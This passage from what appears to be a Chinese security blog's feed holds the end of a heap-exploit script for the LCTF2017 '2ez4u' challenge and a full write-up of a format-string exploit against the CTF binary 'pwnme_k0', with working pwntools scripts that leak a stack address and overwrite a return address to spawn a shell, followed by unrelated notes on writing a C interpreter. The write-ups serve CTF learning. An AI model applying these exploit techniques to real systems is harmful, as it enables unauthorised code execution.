</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,  p64(LIBC+<span class="number">0x3c5c50</span>)) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># recovery</span></span><br><span class="line">edit(<span class="number">0xb</span>, p64(HEAP+<span class="number">0x7e0</span>))</span><br><span class="line">dele(<span class="number">0x6</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'/bin/sh'</span>) <span class="comment"># </span></span><br><span class="line">dele(<span class="number">0x1</span>)</span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>*<span class="number">0x1d0</span>+p64(LIBC+<span class="number">0x4526a</span>)) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-25-161814.png" alt=""></p><h2 id="参考文章及题目链接"><a href="#参考文章及题目链接" class="headerlink" title="参考文章及题目链接"></a>参考文章及题目链接</h2><p><a href="https://github.com/LCTF/LCTF2017/tree/master/src/pwn/2ez4u" target="_blank" rel="noopener">https://github.com/LCTF/LCTF2017/tree/master/src/pwn/2ez4u</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识&lt;/h2&gt;&lt;h3 id=&quot;关于fd-nextsize和bk-nextsize&quot;&gt;&lt;a href=&quot;#关于fd-nextsize和bk-nex
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="堆利用" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>格式化字符串pwn retaddr及三个白帽-pwnme_k0 writeup</title>
    <link href="http://eternalsakura13.com/2018/03/19/pwnme/"/>
    <id>http://eternalsakura13.com/2018/03/19/pwnme/</id>
    <published>2018-03-19T07:50:10.494Z</published>
    <updated>2018-03-19T16:28:00.614Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这个题代码写的略智障。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-19-103337.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-19-103528.png" alt=""><br>其实一共是从rbp-30到rbp-8这么一段空间，一共40个字节来存来存账号和密码。<br>但是存账号是从v16到char v18[20]的前4个字节，确实是16个，但是这么写不会很怪么……<br>密码也是，从数组的第4个字节之后开始存，最大存20个字节，一开始看还以为有溢出，碎碎念一下。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-19-103559.png" alt=""><br>不过实际上漏洞是在打印个人信息的时候，能看到一个格式化字符串漏洞。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-19-103738.png" alt=""><br>而这个&amp;a9+4实际上就是我们输入的密码。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ checksec pwnme_k0 </span><br><span class="line">[*] &apos;/home/sakura/pwnme_k0&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="vulfunc"><a href="#vulfunc" class="headerlink" title="vulfunc"></a>vulfunc</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-19-103950.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-19-104024.png" alt=""><br>这题看了下字符串，发现有可以直接利用的system(‘/bin/sh’)，所以只要用格式化字符串漏洞直接修改某个函数的返回地址为0x4008A6就可以了。</p><h3 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h3><p>首先来跟随一下程序，确定格式化串的相对偏移。<br>写一个程序确定偏移。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf=ELF(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line">p=process(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'break *0x400B39'</span>) <span class="comment">#一开始就把gdb attach上去，然后设置好断点位置，break *0x400B39就是设置断点，然后c一下就执行到断点位置了。</span></span><br><span class="line">p.recvuntil(<span class="string">'Input your username(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input your password(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'%p'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br></pre></td></tr></table></figure></p><p>输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ python offset.py</span><br><span class="line">[DEBUG] PLT 0x400740 putchar</span><br><span class="line">[DEBUG] PLT 0x400748 strcpy</span><br><span class="line">[DEBUG] PLT 0x400750 puts</span><br><span class="line">[DEBUG] PLT 0x400758 write</span><br><span class="line">[DEBUG] PLT 0x400760 setbuf</span><br><span class="line">[DEBUG] PLT 0x400768 system</span><br><span class="line">[DEBUG] PLT 0x400770 printf</span><br><span class="line">[DEBUG] PLT 0x400778 memset</span><br><span class="line">[DEBUG] PLT 0x400780 read</span><br><span class="line">[DEBUG] PLT 0x400788 __libc_start_main</span><br><span class="line">[DEBUG] PLT 0x400790 __gmon_start__</span><br><span class="line">[DEBUG] PLT 0x400798 memcpy</span><br><span class="line">[DEBUG] PLT 0x4007a0 fflush</span><br><span class="line">[DEBUG] PLT 0x4007a8 atol</span><br><span class="line">[*] &apos;/home/sakura/pwnme_k0&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Starting local process &apos;./pwnme_k0&apos;: pid 2885</span><br><span class="line">[DEBUG] Wrote gdb script to &apos;/tmp/pwnoFjEm0.gdb&apos;</span><br><span class="line">    break *0x400B39</span><br><span class="line">[*] running in new terminal: /usr/bin/gdb -q  &quot;/home/sakura/pwnme_k0&quot; 2885 -x &quot;/tmp/pwnoFjEm0.gdb&quot;</span><br><span class="line">[DEBUG] Launching a new terminal: [&apos;/usr/bin/x-terminal-emulator&apos;, &apos;-e&apos;, &apos;/usr/bin/gdb -q  &quot;/home/sakura/pwnme_k0&quot; 2885 -x &quot;/tmp/pwnoFjEm0.gdb&quot;&apos;]</span><br><span class="line">[+] Waiting for debugger: Done</span><br><span class="line">[DEBUG] Received 0x127 bytes:</span><br><span class="line">    &apos;**********************************************\n&apos;</span><br><span class="line">    &apos;*                                            *\n&apos;</span><br><span class="line">    &apos;*Welcome to sangebaimao,Pwnn me and have fun!*\n&apos;</span><br><span class="line">    &apos;*                                            *\n&apos;</span><br><span class="line">    &apos;**********************************************\n&apos;</span><br><span class="line">    &apos;Register Account first!\n&apos;</span><br><span class="line">    &apos;Input your username(max lenth:20): \n&apos;</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    &apos;aaaaaaaa\n&apos;</span><br><span class="line">[DEBUG] Received 0x24 bytes:</span><br><span class="line">    &apos;Input your password(max lenth:20): \n&apos;</span><br><span class="line">[DEBUG] Sent 0x11 bytes:</span><br><span class="line">    &apos;%p%p%p%p%p%p%p%p\n&apos;</span><br><span class="line">[DEBUG] Received 0x5f bytes:</span><br><span class="line">    &apos;Register Success!!\n&apos;</span><br><span class="line">    &apos;1.Sh0w Account Infomation!\n&apos;</span><br><span class="line">    &apos;2.Ed1t Account Inf0mation!\n&apos;</span><br><span class="line">    &apos;3.QUit sangebaimao:(\n&apos;</span><br><span class="line">    &apos;&gt;&apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;aaaaaaaa\n&apos;</span><br></pre></td></tr></table></figure></p><p>下面si只是为了跟进printf函数，个人习惯……不跟也行，只要你知道怎么数格式化串在哪，跟进去的话栈上第一个就肯定是返回地址，注意这里是64位程序，所以返回地址后跟着的就是参数7（offset 6),参数8（offset 7)…..<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; si</span><br><span class="line">0x0000000000400770 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">[──────────────────────────────────REGISTERS───────────────────────────────────]</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x400</span><br><span class="line"> RDX  0x7f6c9f8829e0 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> RDI  0x7fff8ee7f1e4 ◂— 0x7025702570257025 (&apos;%p%p%p%p&apos;)---&gt;格式化字符串存在rdi里</span><br><span class="line"> RSI  0x7f6c9faa6000 ◂— 0x6161616161616161 (&apos;aaaaaaaa&apos;)</span><br><span class="line">.....</span><br><span class="line">[────────────────────────────────────DISASM────────────────────────────────────]</span><br><span class="line"> ► 0x400770                      jmp    qword ptr [rip + 0x20184a]    &lt;0x7f6c9f512340&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f6c9f512340 &lt;printf&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7f6c9f512347 &lt;printf+7&gt;     test   al, al</span><br><span class="line">   0x7f6c9f512349 &lt;printf+9&gt;     mov    qword ptr [rsp + 0x28], rsi</span><br><span class="line">   0x7f6c9f51234e &lt;printf+14&gt;    mov    qword ptr [rsp + 0x30], rdx</span><br><span class="line">   0x7f6c9f512353 &lt;printf+19&gt;    mov    qword ptr [rsp + 0x38], rcx</span><br><span class="line">   0x7f6c9f512358 &lt;printf+24&gt;    mov    qword ptr [rsp + 0x40], r8</span><br><span class="line">   0x7f6c9f51235d &lt;printf+29&gt;    mov    qword ptr [rsp + 0x48], r9</span><br><span class="line">   0x7f6c9f512362 &lt;printf+34&gt;    je     printf+91                     &lt;0x7f6c9f51239b&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f6c9f51239b &lt;printf+91&gt;    lea    rax, [rsp + 0xe0]</span><br><span class="line">   0x7f6c9f5123a3 &lt;printf+99&gt;    mov    rsi, rdi</span><br><span class="line">[────────────────────────────────────STACK─────────────────────────────────────]</span><br><span class="line">00:0000│ rsp    0x7fff8ee7f1b8 —▸ 0x400b3e 返回地址</span><br><span class="line">01:0008│ rbp    0x7fff8ee7f1c0 —▸ 0x7fff8ee7f200 offset 6(因为格式化串是参数1，前6个参数存在寄存器里，所以这里是参数7，相对格式化串就是偏移6)</span><br><span class="line">02:0010│        0x7fff8ee7f1c8 —▸ 0x400d74 offset 7</span><br><span class="line">03:0018│        0x7fff8ee7f1d0 ◂— &apos;aaaaaaaa\n&apos; offset 8</span><br><span class="line">04:0020│        0x7fff8ee7f1d8 ◂— 0xa /* &apos;\n&apos; */ offset 9</span><br><span class="line">05:0028│ rdi-4  0x7fff8ee7f1e0 ◂— 0x7025702500000000 offset 10</span><br><span class="line">06:0030│        0x7fff8ee7f1e8 ◂— &apos;%p%p%p%p%p%p\n&apos;</span><br><span class="line">07:0038│        0x7fff8ee7f1f0 ◂— 0xa70257025 /* &apos;%p%p\n&apos; */</span><br><span class="line">[──────────────────────────────────BACKTRACE───────────────────────────────────]</span><br><span class="line"> ► f 0           400770</span><br><span class="line">   f 1           400b3e</span><br><span class="line">   f 2           400d74</span><br><span class="line">   f 3           400e98</span><br><span class="line">   f 4     7f6c9f4dff45 __libc_start_main+245</span><br></pre></td></tr></table></figure></p><p>这样就找到了，偏移为10，不过0x7025702500000000被00截断了，应该用“后入式“，把地址写在后面，所以偏移应该取12</p><h3 id="修改返回地址"><a href="#修改返回地址" class="headerlink" title="修改返回地址"></a>修改返回地址</h3><p>我们知道：<strong>虽然存储返回地址的内存本身是动态变化的，但是其相对于rbp的地址并不会改变，所以我们可以使用相对地址来计算。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[────────────────────────────────────STACK─────────────────────────────────────]</span><br><span class="line">00:0000│ rsp    0x7fff8ee7f1b8 —▸ 0x400b3e 返回地址</span><br><span class="line">01:0008│ rbp    0x7fff8ee7f1c0 —▸ 0x7fff8ee7f200 </span><br><span class="line">02:0010│        0x7fff8ee7f1c8 —▸ 0x400d74</span><br></pre></td></tr></table></figure></p><p>这里的返回地址是printf的返回地址，此时rbp还没有变化，还没有进入printf，还是当前函数的rbp，则rbp指向的就是old rbp的地址。<br>所以当前的返回地址就在rbp+8，即0x400d74。<br>存储返回地址的内存就是0x7fff8ee7f1c8，它相对于相对于old rbp的地址就是：0x7fff8ee7f200-0x7fff8ee7f1c8=0x38。<br>（这部分说的有点乱，先这么理解着吧……）<br>总之用格式化串先读0x7fff8ee7f1c0地址（offset 6)，得到rbp的地址是0x7fff8ee7f200，再减去0x38就得到存储返回地址的内存地址是0x7fff8ee7f1c8。<br>然后leak出这个地址后，就可以去覆盖这个地址存放的返回值为我们的system(‘/bin/sh’)即0x4008A6<br>当函数返回的时候就getshell.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-19-145650.png" alt=""><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf=ELF(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line">p=process(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'break *0x400B39'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,'break *0x400B3E')</span></span><br><span class="line">p.recvuntil(<span class="string">'Input your username(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input your password(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'%6$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">data=p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">data=data.split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">leak_addr=hex(int(data,<span class="number">16</span>)<span class="number">-0x38</span>)</span><br><span class="line"><span class="keyword">print</span> leak_addr</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br></pre></td></tr></table></figure></p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>这题的username我完全没用到，不过其实结合username更好用一些，不过<br>为了练习”后入式“，我就写的麻烦一点。<br>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">elf=ELF(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line">p=process(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,'break *0x400B39')</span></span><br><span class="line">p.recvuntil(<span class="string">'Input your username(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input your password(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'%6$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">data=p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">data=data.split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">leak_addr=int(data,<span class="number">16</span>)<span class="number">-0x38</span></span><br><span class="line"><span class="comment"># print hex(leak_addr)</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please input new username(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please input new password(max lenth:20):'</span>)</span><br><span class="line">payload = <span class="string">"%2214u%12$hn"</span></span><br><span class="line">payload += p64(leak_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-19-162145.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-19-162241.png" alt=""></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>在写payload的时候<br>我一直把%2214u%12$hn数成11……然后一直GG。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ python -c &apos;print len(&quot;%2214u%12$hn&quot;)&apos;</span><br><span class="line">12</span><br></pre></td></tr></table></figure></p><p>之所以做这道题。。是因为百度杯11月的一道pwn题和这题几乎一模一样…就拿来折腾下好了，不过那题没有system(‘/bin/sh’)可以利用。<br>要考虑leak出来。<br>格式化字符串大部分的利用姿势我都练到了，不过还是不够熟练，慢慢来呗~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;这个题代码写的略智障。&lt;br&gt;&lt;img src=&quot;http://onc55v8te.bkt.clouddn.com/2018-03-19-1
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="格式化字符串" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>手把手教你构建 C 语言编译器（解释器）学习笔记</title>
    <link href="http://eternalsakura13.com/2018/03/14/lotabout/"/>
    <id>http://eternalsakura13.com/2018/03/14/lotabout/</id>
    <published>2018-03-14T12:13:16.972Z</published>
    <updated>2018-03-16T11:11:27.179Z</updated>
    
    <content type="html"><![CDATA[<h1 id="手把手教你构建-C-语言编译器（解释器）学习笔记"><a href="#手把手教你构建-C-语言编译器（解释器）学习笔记" class="headerlink" title="手把手教你构建 C 语言编译器（解释器）学习笔记"></a>手把手教你构建 C 语言编译器（解释器）学习笔记</h1><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>高级语言程序能够在目标计算机上运行之前，它必须被翻译成机器语言，这个翻译过程，也就是编译。<br>通常必须对任意给定的高级程序和与其对应的机器语言编写专用的编译器，但是这样每种编译器编译的高级语言与编译之后的机器语言之间就存在很强的依赖性。<br>减少这种依赖的方法之一是，将整个编译过程划分为几乎独立的两个阶段。<br>在第一个阶段，高级语言被解析出来，其命令被翻译成一种中间处理结果——既不是高级，也不是低级的结果。<br>在第二个阶段，这些中间结果被进一步翻译成目标硬件的机器语言。<br>从软件工程的角度来分解是十分吸引人的，第一阶段仅依赖于高级语言的细节，第二阶段仅依赖于目标机器语言的细节。<br>当然，两个编译阶段之间的接口十分重要，甚至应该单独抽象成一种语言。<br>实际上我们可以明确的描述这种虚拟机，其指令就是由高级语言分解成的中间处理步骤。<br>这种模型的范例有java(java-&gt;byte code(run in JVM))、c#(.NET-&gt;IL(run in CLR))<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-14-185642.png" alt=""></p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><ol><li>我们只设置代码段、数据段（只存放字符串）和栈</li><li>理论上当用户需要分配内存的时候，理论上我们的虚拟机需要维护一个堆用于内存分配，但实际实现上较为复杂且与编译无关，故我们引入一个指令MSET，使我们能直接使用编译器（解释器）中的内存。</li><li>这里为了简化实现过程，大量实现了自己的指令集。</li><li>使用顺序入栈，而不是逆序。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sub_function(arg1, arg2, arg3);</span><br><span class="line"></span><br><span class="line">|    ....       | high address</span><br><span class="line">+---------------+</span><br><span class="line">| arg: 1        |    new_bp + 4</span><br><span class="line">+---------------+</span><br><span class="line">| arg: 2        |    new_bp + 3</span><br><span class="line">+---------------+</span><br><span class="line">| arg: 3        |    new_bp + 2</span><br><span class="line">+---------------+</span><br><span class="line">|return address |    new_bp + 1</span><br><span class="line">+---------------+</span><br><span class="line">| old BP        | &lt;- new BP</span><br><span class="line">+---------------+</span><br><span class="line">| local var 1   |    new_bp - 1</span><br><span class="line">+---------------+</span><br><span class="line">| local var 2   |    new_bp - 2</span><br><span class="line">+---------------+</span><br><span class="line">|    ....       |  low address</span><br></pre></td></tr></table></figure></li></ol><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>运行时候的一些坑点<br>一开始在mac上测试一直segment fault，我就调试了一下。<br>然后注意到比如这个地方<br><code>bp = sp = (int *) ((int) stack + poolsize);// stack grow from high to low</code><br>明显是按照32位地址空间去算的，(int)stack是4字节。<br>所以放进虚拟机里，加上-m32编译。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/logcat$ gcc main.c -m32 -o main</span><br><span class="line">sakura@ubuntu:~/logcat$ ls</span><br><span class="line">main  main.c</span><br><span class="line">sakura@ubuntu:~/logcat$ ./main</span><br><span class="line">exit(30)</span><br></pre></td></tr></table></figure></p><h2 id="词法分析器"><a href="#词法分析器" class="headerlink" title="词法分析器"></a>词法分析器</h2><p>前面的环境准备好之后，我们就可以开始写我们的解释器了。<br>词法分析器对源码字符串做预处理，举例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2 + 3 * (4 - 5)</span><br><span class="line">=&gt;</span><br><span class="line">(Number, 2) Add (Number, 3) Multiply Left-Bracket (Number, 4) Subtract (Number, 5) Right-Bracket</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">                   +-------+                      +--------+</span><br><span class="line">-- source code --&gt; | lexer | --&gt; token stream --&gt; | parser | --&gt; assembly</span><br><span class="line">                   +-------+                      +--------+</span><br></pre></td></tr></table></figure><p>要是深入词法分析器，你就会发现，它的本质上也是编译器。我们的编译器是以标记流为输入，输出汇编代码，而词法分析器则是以源码字符串为输入，输出标记流。</p><h3 id="标识符与符号表"><a href="#标识符与符号表" class="headerlink" title="标识符与符号表"></a>标识符与符号表</h3><p>标识符（identifier）可以理解为变量名。对于语法分析而言，我们并不关心一个变量具体叫什么名字，而只关心这个变量名代表的唯一标识。例如 int a; 定义了变量 a，而之后的语句 a = 10，我们需要知道这两个 a 指向的是同一个变量。</p><p>基于这个理由，词法分析器会把扫描到的标识符全都保存到一张表中，遇到新的标识符就去查这张表，如果标识符已经存在，就返回它的唯一标识。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Symbol table:</span><br><span class="line">----+-----+----+----+----+-----+-----+-----+------+------+----</span><br><span class="line"> .. |token|hash|name|type|class|value|btype|bclass|bvalue| ..</span><br><span class="line">----+-----+----+----+----+-----+-----+-----+------+------+----</span><br><span class="line">    |&lt;---       one single identifier                ---&gt;|</span><br></pre></td></tr></table></figure><p>后面的内容虽然是懂的。。但是写笔记太长了，暂时END吧。<br>TODO</p>]]></content>
    
    <summary type="html">
    
      
      
